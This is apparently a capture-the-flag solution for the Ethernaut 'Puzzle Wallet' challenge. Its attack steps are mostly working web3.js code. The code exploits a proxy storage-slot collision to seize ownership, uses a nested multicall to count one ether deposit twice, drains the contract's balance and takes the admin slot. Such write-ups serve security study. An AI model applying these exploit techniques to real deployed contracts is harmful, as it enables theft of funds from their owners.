-      Proxy
  -   address public pendingAdmin;
  -   address public admin;
-     PuzzleWallet
  -    address public owner;   (Collision with pending admin)
  -    uint256 public maxBalance; (Collision with admin)

STEP 
1. ProposeNewAdmin for owner
2. Add to whitelist
3. crack using deposit and multicall for ether balance
4. execute to drain all balance
5. setMaxBalance(player) for admin


### data for proposeNewAdmin(address)
```js
const fcall = web3.eth.abi.encodeFunctionCall(
    {
        name: 'proposeNewAdmin',
        type: 'function',
        inputs: [{
            type: 'address',
            name: '_newAdmin'
        }]
    }, 
    ["YOUR_WALLET_ADDRESS"]
);

// Run at browser
tx = {
  to: contract.address, 
  data: "[DATA FORM ABOVE]", 
  value: 0, 
  from: player
}
await sendTransaction(tx);
```

### data for multicall([deposit, multicall([deposit])])

```js
const deposit_abi = web3.eth.abi.encodeFunctionCall(
    {
        "inputs": [],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    }, []
)
const multicall_abi = web3.eth.abi.encodeFunctionCall(
    {
        "inputs": [
            {
                "internalType": "bytes[]",
                "name": "data",
                "type": "bytes[]"
            }
        ],
        "name": "multicall",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    }, [[deposit_abi]]
)
const outer_multicall_abi =  web3.eth.abi.encodeFunctionCall(
    {
        "inputs": [
            {
                "internalType": "bytes[]",
                "name": "data",
                "type": "bytes[]"
            }
        ],
        "name": "multicall",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    }, [[deposit_abi, multicall_abi]]
)
console.log(outer_multicall_abi)

// Run at browser
tx = {
  to: contract.address, 
  data: "0xac9650d800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", 
  value: toWei('0.001'), 
  from: player
}
await sendTransaction(tx);
```

### Extract to drain all ethers

```js 
await contract.execute(player, toWei('0.002'), 0);
```
